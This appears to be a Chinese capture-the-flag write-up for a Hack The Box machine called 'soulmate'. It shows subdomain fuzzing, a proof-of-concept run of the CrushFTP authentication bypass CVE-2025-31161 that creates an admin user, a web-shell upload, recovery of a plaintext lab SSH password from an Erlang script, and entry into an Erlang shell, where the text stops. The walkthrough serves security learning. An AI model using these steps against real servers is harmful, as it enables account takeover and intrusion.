id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt -u http://soulmate.htb/ -H &quot;Host:FUZZ.soulmate.htb&quot; -fw <span class="hljs-number">4</span><br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\<br>       /\ \__/ /\ \__/  __  __  /\ \__/<br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\<br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/<br>         \ \_\   \ \_\  \ \____/  \ \_\<br>          \/_/    \/_/   \/___/    \/_/<br><br>       v2.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://soulmate.htb/<br> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-<span class="hljs-number">110000</span>.txt<br> :: Header           : Host: FUZZ.soulmate.htb<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Timeout          : <span class="hljs-number">10</span><br> :: Threads          : <span class="hljs-number">40</span><br> :: Matcher          : Response status: <span class="hljs-number">200</span>-<span class="hljs-number">299</span>,<span class="hljs-number">301</span>,<span class="hljs-number">302</span>,<span class="hljs-number">307</span>,<span class="hljs-number">401</span>,<span class="hljs-number">403</span>,<span class="hljs-number">405</span>,<span class="hljs-number">500</span><br> :: Filter           : Response words: <span class="hljs-number">4</span><br>________________________________________________<br><br>ftp                     [Status: <span class="hljs-number">302</span>, Size: <span class="hljs-number">0</span>, Words: <span class="hljs-number">1</span>, Lines: <span class="hljs-number">1</span>, Duration: <span class="hljs-number">364</span>ms]<br></code></pre></td></tr></table></figure><h1 id="CVE-2025-31161-文件上传"><a href="#CVE-2025-31161-文件上传" class="headerlink" title="CVE-2025-31161+文件上传"></a>CVE-2025-31161+文件上传</h1><p>有一个 ftp 子域名 </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://ftp.soulmate.htb/WebInterface/login.html<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ebcacdf782ce05c8.png"></p><p>CrushFTP，看网页源代码可以发现版本 11.W.657，找到几个身份验证的 CVE</p><ul><li><a href="https://www.freebuf.com/articles/vuls/447732.html">CrushFTP身份验证绕过漏洞(CVE-2025-54309)复现</a></li><li><a href="https://github.com/Immersive-Labs-Sec/CVE-2025-31161">Proof of Concept for CVE-2025-31161 &#x2F; CVE-2025-2825</a></li></ul><p>CVE-2025-31161 可以用</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">This POC will exploit the authbypass vulnerability to create a new user account with Admin level permissions. The Auth Bypass requires the username (target<span class="hljs-emphasis">_user) of an existing user on the CrushFTP server. The default is set to crushadmin</span><br></code></pre></td></tr></table></figure><p>执行 poc </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# python poc.py --target_host ftp.soulmate.htb --port <span class="hljs-number">80</span> --target_user root --new_user butt3rf1y --password adminadmin<br>[+] Preparing Payloads<br>  [-] Warming up the target<br>  [-] Target is up and running<br>[+] Sending Account Create Request<br>  [!] User created successfully<br>[+] Exploit Complete you can now login with<br>   [*] Username: butt3rf1y<br>   [*] Password: adminadmin.<br></code></pre></td></tr></table></figure><p>在 User Manage 模块发现有几个用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/0704ad04d37f5c13.png"></p><p>可以修改用户密码，先改 ben 的，登录进去发现能进行文件上传，上马，马在一段时间后会被删除，所以权限维持动作需要快点</p><p><img src="https://img.dkdun.cn/v1/2025/12/795b09dc4713527b.png"></p><p>反弹 shell，在 <code>/usr/local/lib/erlang_login</code> 的目录下找到 start.escript </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs javascript">#!<span class="hljs-regexp">/usr/</span>bin/env escript<br>%%! -sname ssh_runner<br><br><span class="hljs-title function_">main</span>(_) -&gt;<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(asn1),<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(crypto),<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(public_key),<br>    <span class="hljs-attr">application</span>:<span class="hljs-title function_">start</span>(ssh),<br><br>    <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Starting SSH daemon with logging...~n&quot;</span>),<br><br>    <span class="hljs-keyword">case</span> <span class="hljs-attr">ssh</span>:<span class="hljs-title function_">daemon</span>(<span class="hljs-number">2222</span>, [<br>        &#123;ip, &#123;<span class="hljs-number">127</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;&#125;,<br>        &#123;system_dir, <span class="hljs-string">&quot;/etc/ssh&quot;</span>&#125;,<br><br>        &#123;user_dir_fun, <span class="hljs-title function_">fun</span>(<span class="hljs-title class_">User</span>) -&gt;<br>            <span class="hljs-title class_">Dir</span> = <span class="hljs-attr">filename</span>:<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;/home&quot;</span>, <span class="hljs-title class_">User</span>),<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;</span>, [<span class="hljs-title class_">User</span>, <span class="hljs-title class_">Dir</span>]),<br>            <span class="hljs-attr">filename</span>:<span class="hljs-title function_">join</span>(<span class="hljs-title class_">Dir</span>, <span class="hljs-string">&quot;.ssh&quot;</span>)<br>        end&#125;,<br><br>        &#123;connectfun, <span class="hljs-title function_">fun</span>(<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Method</span>) -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Auth success for user: ~p from ~p via ~p~n&quot;</span>,<br>                      [<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Method</span>]),<br>            <span class="hljs-literal">true</span><br>        end&#125;,<br><br>        &#123;failfun, <span class="hljs-title function_">fun</span>(<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Reason</span>) -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;</span>,<br>                      [<span class="hljs-title class_">User</span>, <span class="hljs-title class_">PeerAddr</span>, <span class="hljs-title class_">Reason</span>]),<br>            <span class="hljs-literal">true</span><br>        end&#125;,<br><br>        &#123;auth_methods, <span class="hljs-string">&quot;publickey,password&quot;</span>&#125;,<br><br>        &#123;user_passwords, [&#123;<span class="hljs-string">&quot;ben&quot;</span>, <span class="hljs-string">&quot;HouseH0ldings998&quot;</span>&#125;]&#125;,<br>        &#123;idle_time, infinity&#125;,<br>        &#123;max_channels, <span class="hljs-number">10</span>&#125;,<br>        &#123;max_sessions, <span class="hljs-number">10</span>&#125;,<br>        &#123;parallel_login, <span class="hljs-literal">true</span>&#125;<br>    ]) <span class="hljs-keyword">of</span><br>        &#123;ok, _Pid&#125; -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;SSH daemon running on port 2222. Press Ctrl+C to exit.~n&quot;</span>);<br>        &#123;error, <span class="hljs-title class_">Reason</span>&#125; -&gt;<br>            <span class="hljs-attr">io</span>:<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Failed to start SSH daemon: ~p~n&quot;</span>, [<span class="hljs-title class_">Reason</span>])<br>    end,<br><br>    receive<br>        stop -&gt; ok<br>    end.<br></code></pre></td></tr></table></figure><p>拿到用户密码，ssh 登录</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;ben&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;HouseH0ldings998&quot;</span><br></code></pre></td></tr></table></figure><p>拿到 userflag</p><h1 id="利用-Erlang-服务加载的-os-模块命令执行"><a href="#利用-Erlang-服务加载的-os-模块命令执行" class="headerlink" title="利用 Erlang 服务加载的 os 模块命令执行"></a>利用 Erlang 服务加载的 os 模块命令执行</h1><p>查看端口开放情况，发现 2222 端口运行了基于 Erlang 的 SSH 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ben@soulmate:~$ nc 127.0.0.1 2222<br>SSH-2.0-Erlang/5.2.9<br></code></pre></td></tr></table></figure><p>登录查看</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">ben@soulmate:~$ <span class="hljs-title">ssh</span> <span class="hljs-title">ben</span>@<span class="hljs-title">localhost</span> -<span class="hljs-title">p</span> 2222</span><br><span class="hljs-function"><span class="hljs-title">ben</span>@<span class="hljs-title">localhost</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">password</span>:</span><br><span class="hljs-function"><span class="hljs-title">Eshell</span> <span class="hljs-title">V15</span>.2.5 (<span class="hljs-title">press</span> <span class="hljs-title">Ctrl</span>+<span class="hljs-title">G</span> <span class="hljs-title">to</span> <span class="hljs-title">abort</span>, <span class="hljs-title">type</span> <span class="hljs-title">help</span>(). <span class="hljs-title">for</span> <span class="hljs-title">help</span>)</span><br><span class="hljs-function">(<span class="hljs-title">ssh_runner</span>@<span class="hljs-title">soulmate</span>)1&gt; <span class="hljs-title">help</span>().</span><br><span class="hljs-function">** <span class="hljs-title">shell</span> <span class="hljs-title">internal</span> <span class="hljs-title">commands</span> **</span><br><span class="hljs-function"><span class="hljs-title">b</span>()        -- <span class="hljs-title">display</span> <span class="hljs-title">all</span> <span class="hljs-title">variable</span> <span class="hljs-title">bindings</span></span><br><span class="hljs-function"><span class="hljs-title">e</span>(<span class="hljs-title">N</span>)       -- <span class="hljs-title">repeat</span> <span class="hljs-title">the</span> <span class="hljs-title">expression</span> <span class="hljs-title">in</span> <span class="hljs-title">query</span> &lt;<span class="hljs-title">N</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">f</span>()        -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">variable</span> <span class="hljs-title">bindings</span></span><br><span class="hljs-function"><span class="hljs-title">f</span>(<span class="hljs-title">X</span>)       -- <span class="hljs-title">forget</span> <span class="hljs-title">the</span> <span class="hljs-title">binding</span> <span class="hljs-title">of</span> <span class="hljs-title">variable</span> <span class="hljs-title">X</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>()        -- <span class="hljs-title">history</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">Mod</span>)     -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Func</span>)-- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">function</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Func</span>,<span class="hljs-title">Arity</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">function</span> <span class="hljs-title">with</span> <span class="hljs-title">arity</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">ht</span>(<span class="hljs-title">Mod</span>)    -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">a</span> <span class="hljs-title">module</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">types</span></span><br><span class="hljs-function"><span class="hljs-title">ht</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Type</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">type</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">ht</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">Type</span>,<span class="hljs-title">Arity</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">type</span> <span class="hljs-title">with</span> <span class="hljs-title">arity</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">hcb</span>(<span class="hljs-title">Mod</span>)    -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">a</span> <span class="hljs-title">module</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">callbacks</span></span><br><span class="hljs-function"><span class="hljs-title">hcb</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">CB</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">callback</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">hcb</span>(<span class="hljs-title">Mod</span>,<span class="hljs-title">CB</span>,<span class="hljs-title">Arity</span>) -- <span class="hljs-title">help</span> <span class="hljs-title">about</span> <span class="hljs-title">callback</span> <span class="hljs-title">with</span> <span class="hljs-title">arity</span> <span class="hljs-title">in</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">history</span>(<span class="hljs-title">N</span>) -- <span class="hljs-title">set</span> <span class="hljs-title">how</span> <span class="hljs-title">many</span> <span class="hljs-title">previous</span> <span class="hljs-title">commands</span> <span class="hljs-title">to</span> <span class="hljs-title">keep</span></span><br><span class="hljs-function"><span class="hljs-title">results</span>(<span class="hljs-title">N</span>) -- <span class="hljs-title">set</span> <span class="hljs-title">how</span> <span class="hljs-title">many</span> <span class="hljs-title">previous</span> <span class="hljs-title">command</span> <span class="hljs-title">results</span> <span class="hljs-title">to</span> <span class="hljs-title">keep</span></span><br><span class="hljs-function"><span class="hljs-title">catch_exception</span>(<span class="hljs-title">B</span>) -- <span class="hljs-title">how</span> <span class="hljs-title">exceptions</span> <span class="hljs-title">are</span> <span class="hljs-title">handled</span></span><br><span class="hljs-function"><span class="hljs-title">v</span>(<span class="hljs-title">N</span>)       -- <span class="hljs-title">use</span> <span class="hljs-title">the</span> <span class="hljs-title">value</span> <span class="hljs-title">of</span> <span class="hljs-title">query</span> &lt;<span class="hljs-title">N</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">rd</span>(<span class="hljs-title">R</span>,<span class="hljs-title">D</span>)    -- <span class="hljs-title">define</span> <span class="hljs-title">a</span> <span class="hljs-title">record</span></span><br><span class="hljs-function"><span class="hljs-title">rf</span>()       -- <span class="hljs-title">remove</span> <span class="hljs-title">all</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">rf</span>(<span class="hljs-title">R</span>)      -- <span class="hljs-title">remove</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">R</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span>()       -- <span class="hljs-title">display</span> <span class="hljs-title">all</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">rl</span>(<span class="hljs-title">R</span>)      -- <span class="hljs-title">display</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">R</span></span><br><span class="hljs-function"><span class="hljs-title">rp</span>(<span class="hljs-title">Term</span>)   -- <span class="hljs-title">display</span> <span class="hljs-title">Term</span> <span class="hljs-title">using</span> <span class="hljs-title">the</span> <span class="hljs-title">shell</span>&#x27;<span class="hljs-title">s</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">rr</span>(<span class="hljs-title">File</span>)   -- <span class="hljs-title">read</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">from</span> <span class="hljs-title">File</span> (<span class="hljs-title">wildcards</span> <span class="hljs-title">allowed</span>)</span><br><span class="hljs-function"><span class="hljs-title">rr</span>(<span class="hljs-title">F</span>,<span class="hljs-title">R</span>)    -- <span class="hljs-title">read</span> <span class="hljs-title">selected</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">from</span> <span class="hljs-title">file</span>(<span class="hljs-title">s</span>)</span><br><span class="hljs-function"><span class="hljs-title">rr</span>(<span class="hljs-title">F</span>,<span class="hljs-title">R</span>,<span class="hljs-title">O</span>)  -- <span class="hljs-title">read</span> <span class="hljs-title">selected</span> <span class="hljs-title">record</span> <span class="hljs-title">information</span> <span class="hljs-title">with</span> <span class="hljs-title">options</span></span><br><span class="hljs-function"><span class="hljs-title">lf</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span></span><br><span class="hljs-function"><span class="hljs-title">lt</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">types</span></span><br><span class="hljs-function"><span class="hljs-title">lr</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">records</span></span><br><span class="hljs-function"><span class="hljs-title">ff</span>()       -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span></span><br><span class="hljs-function"><span class="hljs-title">ff</span>(&#123;<span class="hljs-title">F</span>,<span class="hljs-title">A</span>&#125;)  -- <span class="hljs-title">forget</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">function</span> <span class="hljs-title">named</span> <span class="hljs-title">as</span> <span class="hljs-title">atom</span> <span class="hljs-title">F</span> <span class="hljs-title">and</span> <span class="hljs-title">arity</span> <span class="hljs-title">A</span></span><br><span class="hljs-function"><span class="hljs-title">tf</span>()       -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">types</span></span><br><span class="hljs-function"><span class="hljs-title">tf</span>(<span class="hljs-title">T</span>)      -- <span class="hljs-title">forget</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">type</span> <span class="hljs-title">named</span> <span class="hljs-title">as</span> <span class="hljs-title">atom</span> <span class="hljs-title">T</span></span><br><span class="hljs-function"><span class="hljs-title">fl</span>()       -- <span class="hljs-title">forget</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span>, <span class="hljs-title">types</span> <span class="hljs-title">and</span> <span class="hljs-title">records</span></span><br><span class="hljs-function"><span class="hljs-title">save_module</span>(<span class="hljs-title">FilePath</span>) -- <span class="hljs-title">save</span> <span class="hljs-title">all</span> <span class="hljs-title">locally</span> <span class="hljs-title">defined</span> <span class="hljs-title">functions</span>, <span class="hljs-title">types</span> <span class="hljs-title">and</span> <span class="hljs-title">records</span> <span class="hljs-title">to</span> <span class="hljs-title">a</span> <span class="hljs-title">file</span></span><br><span class="hljs-function"><span class="hljs-title">bt</span>(<span class="hljs-title">Pid</span>)    -- <span class="hljs-title">stack</span> <span class="hljs-title">backtrace</span> <span class="hljs-title">for</span> <span class="hljs-title">a</span> <span class="hljs-title">process</span></span><br><span class="hljs-function"><span class="hljs-title">c</span>(<span class="hljs-title">Mod</span>)     -- <span class="hljs-title">compile</span> <span class="hljs-title">and</span> <span class="hljs-title">load</span> <span class="hljs-title">module</span> <span class="hljs-title">or</span> <span class="hljs-title">file</span> &lt;<span class="hljs-title">Mod</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">cd</span>(<span class="hljs-title">Dir</span>)    -- <span class="hljs-title">change</span> <span class="hljs-title">working</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function"><span class="hljs-title">flush</span>()    -- <span class="hljs-title">flush</span> <span class="hljs-title">any</span> <span class="hljs-title">messages</span> <span class="hljs-title">sent</span> <span class="hljs-title">to</span> <span class="hljs-title">the</span> <span class="hljs-title">shell</span></span><br><span class="hljs-function"><span class="hljs-title">help</span>()     -- <span class="hljs-title">help</span> <span class="hljs-title">info</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">M</span>)       -- <span class="hljs-title">module</span> <span class="hljs-title">documentation</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">M</span>,<span class="hljs-title">F</span>)     -- <span class="hljs-title">module</span> <span class="hljs-title">function</span> <span class="hljs-title">documentation</span></span><br><span class="hljs-function"><span class="hljs-title">h</span>(<span class="hljs-title">M</span>,<span class="hljs-title">F</span>,<span class="hljs-title">A</span>)   -- <span class="hljs-title">module</span> <span class="hljs-title">function</span> <span class="hljs-title">arity</span> <span class="hljs-title">documentation</span></span><br><span class="hljs-function"><span class="hljs-title">i</span>()        -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">the</span> <span class="hljs-title">system</span></span><br><span class="hljs-function"><span class="hljs-title">ni</span>()       -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">the</span> <span class="hljs-title">networked</span> <span class="hljs-title">system</span></span><br><span class="hljs-function"><span class="hljs-title">i</span>(<span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span>)   -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">pid</span> &lt;<span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">l</span>(<span class="hljs-title">Module</span>)  -- <span class="hljs-title">load</span> <span class="hljs-title">or</span> <span class="hljs-title">reload</span> <span class="hljs-title">module</span></span><br><span class="hljs-function"><span class="hljs-title">lm</span>()       -- <span class="hljs-title">load</span> <span class="hljs-title">all</span> <span class="hljs-title">modified</span> <span class="hljs-title">modules</span></span><br><span class="hljs-function"><span class="hljs-title">lc</span>([<span class="hljs-title">File</span>]) -- <span class="hljs-title">compile</span> <span class="hljs-title">a</span> <span class="hljs-title">list</span> <span class="hljs-title">of</span> <span class="hljs-title">Erlang</span> <span class="hljs-title">modules</span></span><br><span class="hljs-function"><span class="hljs-title">ls</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">files</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">current</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function"><span class="hljs-title">ls</span>(<span class="hljs-title">Dir</span>)    -- <span class="hljs-title">list</span> <span class="hljs-title">files</span> <span class="hljs-title">in</span> <span class="hljs-title">directory</span> &lt;<span class="hljs-title">Dir</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">m</span>()        -- <span class="hljs-title">which</span> <span class="hljs-title">modules</span> <span class="hljs-title">are</span> <span class="hljs-title">loaded</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>(<span class="hljs-title">Mod</span>)     -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">module</span> &lt;<span class="hljs-title">Mod</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">mm</span>()       -- <span class="hljs-title">list</span> <span class="hljs-title">all</span> <span class="hljs-title">modified</span> <span class="hljs-title">modules</span></span><br><span class="hljs-function"><span class="hljs-title">memory</span>()   -- <span class="hljs-title">memory</span> <span class="hljs-title">allocation</span> <span class="hljs-title">information</span></span><br><span class="hljs-function"><span class="hljs-title">memory</span>(<span class="hljs-title">T</span>)  -- <span class="hljs-title">memory</span> <span class="hljs-title">allocation</span> <span class="hljs-title">information</span> <span class="hljs-title">of</span> <span class="hljs-title">type</span> &lt;<span class="hljs-title">T</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">nc</span>(<span class="hljs-title">File</span>)   -- <span class="hljs-title">compile</span> <span class="hljs-title">and</span> <span class="hljs-title">load</span> <span class="hljs-title">code</span> <span class="hljs-title">in</span> &lt;<span class="hljs-title">File</span>&gt; <span class="hljs-title">on</span> <span class="hljs-title">all</span> <span class="hljs-title">nodes</span></span><br><span class="hljs-function"><span class="hljs-title">nl</span>(<span class="hljs-title">Module</span>) -- <span class="hljs-title">load</span> <span class="hljs-title">module</span> <span class="hljs-title">on</span> <span class="hljs-title">all</span> <span class="hljs-title">nodes</span></span><br><span class="hljs-function"><span class="hljs-title">pid</span>(<span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span>) -- <span class="hljs-title">convert</span> <span class="hljs-title">X</span>,<span class="hljs-title">Y</span>,<span class="hljs-title">Z</span> <span class="hljs-title">to</span> <span class="hljs-title">a</span> <span class="hljs-title">Pid</span></span><br><span class="hljs-function"><span class="hljs-title">pwd</span>()      -- <span class="hljs-title">print</span> <span class="hljs-title">working</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function"><span class="hljs-title">q</span>()        -- <span class="hljs-title">quit</span> - <span class="hljs-title">shorthand</span> <span class="hljs-title">for</span> <span class="hljs-title">init:stop</span>()</span><br><span class="hljs-function"><span class="hljs-title">regs</span>()     -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">registered</span> <span class="hljs-title">processes</span></span><br><span class="hljs-function"><span class="hljs-title">nregs</span>()    -- <span class="hljs-title">information</span> <span class="hljs-title">about</span> <span class="hljs-title">all</span> <span class="hljs-title">registered</span> <span class="hljs-title">processes</span></span><br><span class="hljs-function"><span class="hljs-title">uptime</span>()   -- <span class="hljs-title">print</span> <span class="hljs-title">node</span> <span class="hljs-title">uptime</span></span><br><span class="hljs-function"><span class="hljs-title">xm</span>(<span class="hljs-title">M</span>)      -- <span class="hljs-title">cross</span> <span class="hljs-title">reference</span> <span class="hljs-title">check</span> <span 